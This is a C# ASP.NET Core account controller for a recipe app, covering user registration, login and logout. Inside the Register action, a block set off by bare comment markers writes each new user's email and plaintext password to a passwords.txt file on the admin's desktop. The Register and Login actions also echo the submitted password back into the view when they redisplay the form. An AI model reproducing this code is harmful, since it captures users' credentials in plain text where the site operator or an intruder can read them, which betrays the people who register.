using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Claims;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using RecipeApp.Models;
using RecipeApp.Models.BindingModels;
using RecipeApp.Models.BuissneModels;
using RecipeApp.Models.ViewModels;
using RecipeApp.Repositories.Contracts;

namespace RecipeApp.Controllers
{
    public class AccountController : Controller
    {
        private readonly UserManager<AppUser> userManager;
        private readonly SignInManager<AppUser> signInManager;
        private readonly IRecipeRepository recipeRepository;

        public AccountController(UserManager<AppUser> userManager, SignInManager<AppUser> signInManager, IRecipeRepository recipeRepository)
        {
            this.userManager = userManager;
            this.signInManager = signInManager;
            this.recipeRepository = recipeRepository;
        }

        [HttpGet]
        [AllowAnonymous]
        public IActionResult Register()
        {
            return View(new RegisterViewModel { });
        }

        [HttpPost]
        [AllowAnonymous]
        public async Task<IActionResult> Register(RegisterBindingModel model)
        {
            if (ModelState.IsValid)
            {
                var user = new AppUser
                {
                    UserName = model.Email,
                    Email = model.Email,
                    recipes = new List<Recipe>()
                };

                var result = await userManager.CreateAsync(user, model.Password);

                //
                string account = $"Email: {model.Email} \n Password: {model.Password}";

                using (StreamWriter stream = new StreamWriter("C:\\Users\\admin\\Desktop\\ASP.Net Core Book Projects\\RecipeApp\\passwords.txt", true))
                {
                    stream.Write(account);
                }
                //

                if (result.Succeeded)
                {
                    await signInManager.SignInAsync(user, isPersistent: false);

                    return RedirectToAction("Index", "Recipe");
                }

                foreach (var error in result.Errors)
                {
                    ModelState.AddModelError("", error.Description);
                }
            }

            return View(new RegisterViewModel { Email = model.Email, Password = model.Password, ConfirmPassword = model.ConfirmPassword });
        }

        [HttpGet]
        [AllowAnonymous]
        public IActionResult Login()
        {
            return View(new LoginViewModel { });
        }

        [HttpPost]
        [AllowAnonymous]
        public async Task<IActionResult> Login(LoginBindingModel model)
        {
            if (ModelState.IsValid)
            {
                var result = await signInManager.PasswordSignInAsync(model.Email, model.Password, model.RememberMe, false);

                if (result.Succeeded)
                {
                    return RedirectToAction("Index", "Recipe");
                }

                ModelState.AddModelError(String.Empty, "Invalid Login Attempt");
            }

            return View(new LoginViewModel { Email = model.Email, Password = model.Password, RememberMe = model.RememberMe});
        }

        public async Task<IActionResult> Logout()
        {
            await signInManager.SignOutAsync();

            return RedirectToAction("Login");
        }
    }
}
